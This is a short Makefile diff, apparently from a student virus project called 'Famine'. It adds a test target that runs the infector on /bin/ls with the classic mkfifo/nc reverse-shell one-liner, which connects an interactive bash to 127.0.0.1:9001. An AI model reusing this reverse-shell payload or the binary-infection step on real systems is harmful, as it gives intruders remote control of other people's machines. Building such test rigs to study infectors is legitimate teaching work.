@@ -51,6 +51,11 @@ docker:
 tester:
 	@./rsc/famine_tester.sh "/tmp/test /tmp/test2"
 
+reverse_shell_test:
+	@make bonus
+	@./Famine /bin/ls -c1 -a 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 127.0.0.1 9001 >/tmp/f &'
+	@./woody
+
 
 clear_mandatory:
 ifeq ($(shell [ -f ${OBJ_DIR}/main.o ] && echo 0 || echo 1), 0)
